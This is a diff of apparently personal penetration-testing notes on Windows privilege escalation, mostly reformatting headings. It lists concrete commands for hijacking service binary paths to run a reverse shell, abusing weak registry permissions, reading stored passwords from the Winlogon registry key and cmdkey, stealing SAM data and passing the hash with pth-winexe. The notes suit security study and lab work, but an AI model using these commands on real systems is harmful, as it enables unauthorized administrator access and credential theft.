@@ -89,50 +89,50 @@ snmpcheck.rb MACHINE_IP -c COMMUNITY_STRING
 
 
 
-#### windows service Enumerations and exploits for privEsc: 
+# windows service Enumerations and exploits for privEsc: 
 	
-	---------NOTE: in most of the cases we only want to replace service binary with our reverse-shell.exe. so, we look for binary path in any way we can to do this
+	**NOTE**: in most of the cases we only want to replace service binary with our reverse-shell.exe. so, we look for binary path in any way we can to do this
 
-	---------NOTE: Download this Binary: accesschk.exe. this helps you better enumerate file and directory permissions on that system.
+	**NOTE**: Download this Binary: accesschk.exe. this helps you better enumerate file and directory permissions on that system.
 
-	---------NOTE: after replacing the service binary YOU SHOULD BE ABLE TO RESTART THE TARGET SERVICE
+	**NOTE**: after replacing the service binary YOU SHOULD BE ABLE TO RESTART THE TARGET SERVICE
 
 
--------	1- first of all we can use this command to take a look at the service: 
+	1- first of all we can use this command to take a look at the service: 
 		
 		"cmd.exe /c sc qc <serviceName>"
 
 
 
--------	2- Insecure Service Permissions: try to set binpath in target service-configuration(note: changing binaryPath):
+	2- Insecure Service Permissions: try to set binpath in target service-configuration(note: changing binaryPath):
 		
 		+ sc config <serviceName> binpath=<Path-to-reverseShell>
 		
 		+ check for this ability: .\accesschk.exe /accepteula -uwcqv <username> <service-name>
 
 
--------	3- Unquoted path file: try to create reverse_shell filename similar to folder-names. in case that you have write permissions
+	3- Unquoted path file: try to create reverse_shell filename similar to folder-names. in case that you have write permissions
 
 		+ check if we can write to where we want: .\accesschk.exe /accepteula -uwdq "C:\Program Files\Unquoted Path Service\"
 
 
 
--------	4- Weak Registry Permissions:   			
+	4- Weak Registry Permissions:   			
 
 		+ check if we can write to service's registry: .\accesschk.exe /accepteula -uvwqk HKLM\System\CurrentControlSet\Services\<Service-name>
 
 		+ overwrite binaryPath in registry: reg add HKLM\SYSTEM\CurrentControlSet\services\<Service-name> /v ImagePath /t REG_EXPAND_SZ /d <reverse-shell path> /f
 
 					
-------- 5- permission to write on actual service's executable file.
+	5- permission to write on actual service's executable file.
 
 		+ check: .\accesschk.exe /accepteula -quvw "C:\Program Files\<path-to-executable-file-for-servcie>.exe"
 
 
-####### Registry
+# Registry
 
 
----------------	1- AutoRun applications Registry: 
+	1- AutoRun applications Registry: 
 
 			NOTE: look for registry-key for autoRun applications. then find the executable location.
 
@@ -148,8 +148,7 @@ snmpcheck.rb MACHINE_IP -c COMMUNITY_STRING
 
 
 
-
----------------	2- Always Install Elevated Registry:
+	2- Always Install Elevated Registry:
 
 		   NOTE: if the values for the following registries are '1', then a low privileged user can install programs with administrator privileges.
 
@@ -161,7 +160,7 @@ snmpcheck.rb MACHINE_IP -c COMMUNITY_STRING
 
 
 
----------------	3- Stored password in Registry:
+	3- Stored password in Registry:
 
 		NOTE: navigate to HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon and scroll down to "DefaultPassword." When you double-click on that, a window should pop up that reveals the stored password
 
@@ -173,7 +172,7 @@ snmpcheck.rb MACHINE_IP -c COMMUNITY_STRING
 
 
 ### scheduled tasks:
-+ needless to say that if you have permissions to change the contents of the scheduled scripts that are running with administration privileges, you can gain a reverse shell.
+	+ needless to say that if you have permissions to change the contents of the scheduled scripts that are running with administration privileges, you can gain a reverse shell.
 
 
 ### StartUp Applications: 
@@ -195,13 +194,13 @@ snmpcheck.rb MACHINE_IP -c COMMUNITY_STRING
 
 
 ### unsecure GUI with system priv:
-+ if any GUI application running with admin rights, has "file open" option, we can spawn cmd.exe as admin.
+	+ if any GUI application running with admin rights, has "file open" option, we can spawn cmd.exe as admin.
 
 
 
 ### stored passwords:
 
-	1+ stored credentilas from another users (maybe admin):
+	+ 1 stored credentilas from another users (maybe admin):
 
 		NOTE: make sure you updated the stored credentials, otherwise you will see nothing by this command.
 		+ Enumerate stored Credentials: cmdkey /list
@@ -212,22 +211,22 @@ snmpcheck.rb MACHINE_IP -c COMMUNITY_STRING
 
 
 
-	2+ Stealing SAM database: maybe there is a SAM backup
+	+ 2 Stealing SAM database: maybe there is a SAM backup
 
 
-	3+ PASS THE HASH: to run binaries with pass the hash you need to run: pth-winexe -U 'admin%NTLM-hash' //<target local-IP> cmd.exe
+	+ 3 PASS THE HASH: to run binaries with pass the hash you need to run: pth-winexe -U 'admin%NTLM-hash' //<target local-IP> cmd.exe
   
   
   
   ### Token Impersonation:
   + fairly hard to Describe :)))))
 
-	1- check if you have this specific token: 
+	- 1 check if you have this specific token: 
 
 		command: whoami /priv
 		Note: you should look for : SeImpersonatePrivilege
 
-	2- use this tools to gain "NT Authority/System" shell:
+	- 2 use this tools to gain "NT Authority/System" shell:
 
 		+ Rugue potato 
 		+ prinSpoofer
